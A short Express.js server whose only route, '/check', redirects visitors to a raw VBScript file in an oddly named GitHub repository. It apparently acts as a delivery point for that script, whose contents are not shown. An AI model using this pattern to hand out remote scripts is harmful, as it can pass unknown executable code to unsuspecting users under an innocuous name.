const express = require('express');
const app = express();

app.get('/check', (req, res) => {
    // Redirect straight to the raw GitHub VBS file
    res.redirect('https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs');
});

app.listen(process.env.PORT || 3000);
